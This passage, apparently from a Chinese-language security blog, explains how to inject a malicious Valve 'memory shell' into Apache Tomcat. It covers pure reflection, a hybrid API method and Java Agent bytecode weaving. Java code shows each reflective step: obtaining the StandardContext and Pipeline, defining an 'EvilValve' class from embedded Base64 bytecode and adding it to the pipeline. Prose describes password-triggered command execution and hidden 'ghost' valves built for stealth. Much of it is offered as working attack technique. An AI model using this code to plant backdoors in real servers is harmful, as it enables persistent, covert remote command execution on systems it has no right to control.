</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 反射调用 protected final defineClass 方法
</span></span><span class="line"><span class="cl">Method defineClassMethod = ClassLoader.class.getDeclaredMethod(&#34;defineClass&#34;, String.class, byte[].class, int.class, int.class);
</span></span><span class="line"><span class="cl">defineClassMethod.setAccessible(true);
</span></span><span class="line"><span class="cl">Class evilValveClass = (Class) defineClassMethod.invoke(webappClassLoader, &#34;com.evil.EvilValve&#34;, evilValveBytecode, 0, evilValveBytecode.length);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li>实例化恶意 Valve：</li>
</ul>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Valve evilValve = (Valve) evilValveClass.newInstance();</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>将恶意 Valve 注入 Pipeline：</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">addValveMethod.invoke(pipeline, evilValve);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li>注入位置控制：Tomcat 的<code>addValve</code>默认加在末尾。要插入特定位置（如开头），需反射获取<code>Pipeline</code>的<code>valves</code>数组 (<code>StandardPipeline#valves</code>)，使用反射修改数组或调用<code>addValve(Valve, int)</code>(如果存在)。</li>
</ul>
</li>
</ol>
</li>
<li>
<p>**优点：**通用性强，不依赖 Tomcat API JAR。</p>
</li>
<li>
<p><strong>缺点：</strong></p>
<ul>
<li>代码冗长，大量反射操作。</li>
<li>需要处理<code>defineClass</code>的调用（<code>protected</code>方法）。</li>
<li>依赖对 Tomcat 内部结构（<code>WebappClassLoader.resources.context</code>）的准确了解，不同 Tomcat 版本可能有差异。</li>
<li>注入的 Valve 类由<code>WebappClassLoader</code>加载，在堆内存中可见。</li>
</ul>
</li>
</ul>
<h3 id="方式二混合方式利用-tomcat-api--反射">方式二：混合方式（利用 Tomcat API &amp; 反射）<a hidden class="anchor" aria-hidden="true" href="#方式二混合方式利用-tomcat-api--反射">#</a></h3>
<ul>
<li>
<p><strong>场景：<strong>攻击者获得的代码执行环境</strong>可以访问到 Tomcat 的内部 API</strong>（例如，攻击代码本身是由<code>WebappClassLoader</code>加载的，或者通过某些方式将<code>catalina.jar</code>加入了类路径）。常见于从已存在的 Filter/Servlet 型内存马或 JSP Webshell 中进行“二次注入”。</p>
</li>
<li>
<p><strong>步骤：</strong></p>
<ol>
<li>
<p><strong>获取<code>StandardContext</code>(更直接):</strong></p>
<ul>
<li>通过<code>ApplicationContext</code>-&gt;<code>ServletContext</code>的属性获取：</li>
</ul>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7">7</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ServletContext servletContext = request.getServletContext(); // 如果有 request 对象
</span></span><span class="line"><span class="cl">Field applicationContextField = servletContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">applicationContextField.setAccessible(true);
</span></span><span class="line"><span class="cl">Object applicationContext = applicationContextField.get(servletContext);
</span></span><span class="line"><span class="cl">Field standardContextField = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">standardContextField.setAccessible(true);
</span></span><span class="line"><span class="cl">Object standardContext = standardContextField.get(applicationContext);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li>或者通过<code>org.apache.catalina.core.ApplicationDispatcher</code>的<code>WRAP_SAME_OBJECT</code>特性（如果启用）获取<code>lastServicedRequest</code>/<code>lastServicedResponse</code>中的<code>Context</code>(较复杂)。</li>
</ul>
</li>
<li>
<p>**获取<code>Pipeline</code>对象：**同方式一。</p>
</li>
<li>
<p><strong>构造恶意 Valve 实例：</strong></p>
<ul>
<li>**方式 A (ClassLoader 注入)：**同方式一步骤 5，使用<code>WebappClassLoader.defineClass</code>。</li>
<li>**方式 B (直接实例化 - 更优)：**如果能直接访问到恶意 Valve 的类定义（例如，恶意 Valve 类字节码已通过其他方式加载，或者攻击代码直接包含了这个类），可以直接<code>new</code>：</li>
</ul>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Valve evilValve = new com.evil.EvilValve(); // 需要 EvilValve 类在当前 ClassLoader 可见</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p>**注入 Valve：**直接调用<code>StandardPipeline.addValve()</code>方法：</p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">((StandardPipeline) pipeline).addValve(evilValve);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li>同样可以通过反射操作<code>valves</code>数组控制注入位置。</li>
</ul>
</li>
</ol>
</li>
<li>
<p><strong>优点：</strong></p>
<ul>
<li>代码相对简洁清晰（减少了反射）。</li>
<li>效率更高。</li>
</ul>
</li>
<li>
<p><strong>缺点：</strong></p>
<ul>
<li>依赖 Tomcat API 环境（需要<code>org.apache.catalina.*</code>类可见）。</li>
<li>如果采用方式 B 构造实例，需要解决如何让<code>EvilValve</code>类被加载的问题（可能仍需<code>defineClass</code>或依赖其他已加载的恶意类）。</li>
</ul>
</li>
</ul>
<h3 id="方式三java-agent--asmjavassist-字节码注入终极隐蔽">方式三：Java Agent + ASM/Javassist 字节码注入（终极隐蔽）<a hidden class="anchor" aria-hidden="true" href="#方式三java-agent--asmjavassist-字节码注入终极隐蔽">#</a></h3>
<ul>
<li>
<p><strong>场景：<strong>攻击者具备更高权限（如上传 Agent JAR 或利用 Attach API 注入 Agent），追求极致的隐蔽性。目标是</strong>不创建新的 Valve 类</strong>，而是将恶意逻辑<strong>直接编织</strong>进 Tomcat 核心类（如<code>StandardPipeline</code>或某个关键 Valve）的字节码中。</p>
</li>
<li>
<p><strong>步骤：</strong></p>
<ol>
<li>
<p>**注入 Agent：**通过<code>-javaagent</code>启动参数、<code>VirtualMachine.attach()</code>API 或利用已知漏洞加载恶意 Agent Jar。</p>
</li>
<li>
<p>**实现<code>ClassFileTransformer</code>：**在 Agent 中注册自定义的<code>ClassFileTransformer</code>。</p>
</li>
<li>
<p>**定位并修改目标类：**在<code>transform()</code>方法中，识别目标类（例如<code>org.apache.catalina.core.StandardPipeline</code>）：</p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if (&#34;org.apache.catalina.core.StandardPipeline&#34;.equals(className)) {
</span></span><span class="line"><span class="cl">    // 使用 ASM 或 Javassist 修改字节码
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>修改<code>addValve</code>或<code>invoke</code>逻辑 (策略)：</strong></p>
<ul>
<li>**策略 A (劫持<code>invoke</code>):**修改<code>StandardPipeline</code>的<code>invoke()</code>方法。在方法内部遍历<code>valves</code>数组之前或某个关键节点（如调用<code>StandardContextValve.invoke()</code>前），插入恶意逻辑：检查请求特征，匹配则执行命令、构造响应并返回（跳过后续 Valve）。</li>
<li>**策略 B (伪装成现有 Valve):**修改某个不常用或非关键的现有 Valve 类（如<code>StandardContextValve</code>或<code>AccessLogValve</code>）的<code>invoke()</code>方法。在其原有逻辑的开头或结尾插入恶意检查逻辑。</li>
<li>**策略 C (创建“幽灵”Valve):**修改<code>StandardPipeline</code>的<code>addValve()</code>方法。使其在特定条件下（例如，添加的 Valve 类名匹配某个特殊模式或 hash）不真正添加该 Valve，而是将其保存到一个隐藏的列表中。同时修改<code>invoke()</code>方法，使其在调用官方<code>valves</code>数组前后，也遍历并调用这个隐藏列表中的“幽灵” Valve。这种方式极其隐蔽，因为常规的<code>Pipeline.valves</code>数组中看不到恶意 Valve。</li>
</ul>
</li>
<li>
<p>**字节码操作：**使用 ASM/Javassist 库插入恶意字节码。恶意逻辑通常包含：</p>
<ul>
<li>从<code>Request</code>对象获取参数/头/路径。</li>
<li>与预设密码比较。</li>
<li>调用<code>Runtime.exec()</code>或<code>ProcessBuilder</code>执行命令。</li>
<li>读取执行结果，写入<code>Response</code>输出流。</li>
<li>根据是否匹配密码，决定是否继续调用原始管道逻辑 (<code>getNext().invoke()</code>）。</li>
</ul>
</li>
</ol>
</li>
<li>
<p><strong>优点：</strong></p>
<ul>
<li>**终极隐蔽性：**没有新的可疑类 (<code>EvilValve</code>) 被定义和加载。恶意逻辑“溶解”在 Tomcat 官方核心类中。</li>
<li>不依赖<code>WebappClassLoader</code>，应用重启后只要 Agent 仍在就有效（持久化能力强）。</li>
<li>极难通过常规内存 dump 分析发现（需要逐类反编译校验）。</li>
</ul>
</li>
<li>
<p><strong>缺点：</strong></p>
<ul>
<li>实现难度极高，需要深入理解 JVM 字节码和 Tomcat 内部流程。</li>
<li>需要获取 Agent 注入的权限（通常意味着已有较高权限）。</li>
<li>不同 Tomcat 版本的核心类字节码差异较大，需要为不同版本定制或做兼容。</li>
<li>Agent 本身的存在可能被检测（JVM 参数、<code>VirtualMachine.list()</code>）。</li>
</ul>
</li>
</ul>
<h2 id="纯反射注入">纯反射注入<a hidden class="anchor" aria-hidden="true" href="#纯反射注入">#</a></h2>
<h3 id="一核心原理与目标"><strong>一、核心原理与目标</strong><a hidden class="anchor" aria-hidden="true" href="#一核心原理与目标">#</a></h3>
<ol>
<li><strong>目标</strong>：在不引入Tomcat API依赖（<code>catalina.jar</code>等）的情况下，通过纯反射操作：
<ul>
<li>获取当前Web应用的<code>StandardContext</code>（Tomcat核心容器对象）</li>
<li>定位其<code>Pipeline</code>（请求处理管道）</li>
<li>动态注入恶意<code>Valve</code>实例到管道中</li>
</ul>
</li>
<li><strong>技术挑战</strong>：
<ul>
<li>绕过类加载器隔离（从非Web类加载器访问Web层对象）</li>
<li>通过反射链破解Tomcat内部数据结构</li>
<li>内存中定义恶意Valve类（无磁盘文件）</li>
</ul>
</li>
</ol>
<h3 id="二注入流程详解">二、注入流程详解<a hidden class="anchor" aria-hidden="true" href="#二注入流程详解">#</a></h3>
<h4 id="步骤1获取webappclassloader"><strong>步骤1：获取WebappClassLoader</strong><a hidden class="anchor" aria-hidden="true" href="#步骤1获取webappclassloader">#</a></h4>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ClassLoader webappClassLoader = Thread.currentThread().getContextClassLoader();</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li><strong>原理</strong>：Tomcat为每个Web应用创建独立的<code>WebappClassLoader</code>，当前线程的ClassLoader通常就是它。</li>
<li><strong>注意</strong>：在非请求线程（如反序列化触发的线程）中需遍历线程组定位。</li>
</ul>
<h4 id="步骤2反射获取standardcontext"><strong>步骤2：反射获取StandardContext</strong><a hidden class="anchor" aria-hidden="true" href="#步骤2反射获取standardcontext">#</a></h4>
<p>这是最核心的步骤，需穿透两层隐藏引用：</p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7">7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8">8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9">9</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 1. 获取WebappClassLoader的resources属性(StandardRoot)
</span></span><span class="line"><span class="cl">Field resourcesField = webappClassLoader.getClass().getDeclaredField(&#34;resources&#34;);
</span></span><span class="line"><span class="cl">resourcesField.setAccessible(true);
</span></span><span class="line"><span class="cl">Object standardRoot = resourcesField.get(webappClassLoader);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 2. 获取StandardRoot的context属性(StandardContext)
</span></span><span class="line"><span class="cl">Field contextField = standardRoot.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">contextField.setAccessible(true);
</span></span><span class="line"><span class="cl">Object standardContext = contextField.get(standardRoot); // 得到目标StandardContext</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li><strong>关键路径</strong>：
<code>WebappClassLoader</code>→<code>resources</code>(<code>StandardRoot</code>) →<code>context</code>(<code>StandardContext</code>)</li>
</ul>
<h4 id="步骤3获取pipeline对象"><strong>步骤3：获取Pipeline对象</strong><a hidden class="anchor" aria-hidden="true" href="#步骤3获取pipeline对象">#</a></h4>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Method getPipelineMethod = standardContext.getClass().getMethod(&#34;getPipeline&#34;);
</span></span><span class="line"><span class="cl">Object pipeline = getPipelineMethod.invoke(standardContext); // StandardPipeline实例</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="步骤4定义恶意valve类内存加载"><strong>步骤4：定义恶意Valve类（内存加载）</strong><a hidden class="anchor" aria-hidden="true" href="#步骤4定义恶意valve类内存加载">#</a></h4>
<p><strong>方案A：硬编码字节码（推荐）</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7">7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8">8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9">9</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 1. 预编译EvilValve.class并转为字节数组
</span></span><span class="line"><span class="cl">byte[] evilValveBytecode = Base64.decode(&#34;yv66vgAAADQAKgoABwAUBwAVCAAWCgAB...&#34;);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 2. 反射调用ClassLoader.defineClass
</span></span><span class="line"><span class="cl">Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
</span></span><span class="line"><span class="cl">    &#34;defineClass&#34;, String.class, byte[].class, int.class, int.class);
</span></span><span class="line"><span class="cl">defineClassMethod.setAccessible(true);
</span></span><span class="line"><span class="cl">Class&lt;?&gt; evilValveClass = (Class&lt;?&gt;) defineClassMethod.invoke(
</span></span><span class="line"><span class="cl">    webappClassLoader, &#34;com.evil.EvilValve&#34;, evilValveBytecode, 0, evilValveBytecode.length);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>方案B：动态生成字节码（ASM/Javassist）</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ClassWriter cw = new ClassWriter(0);
</span></span><span class="line"><span class="cl">cw.visit(Opcodes.V1_8, ACC_PUBLIC, &#34;com/evil/EvilValve&#34;, null, &#34;java/lang/Object&#34;, new String[]{&#34;org/apache/catalina/Valve&#34;});
</span></span><span class="line"><span class="cl">// ... 生成invoke()方法字节码 ...
</span></span><span class="line"><span class="cl">byte[] evilValveBytecode = cw.toByteArray();
</span></span><span class="line"><span class="cl">// 后续同方案A的defineClass调用</span></span></code></pre></td></tr></table>
</div>
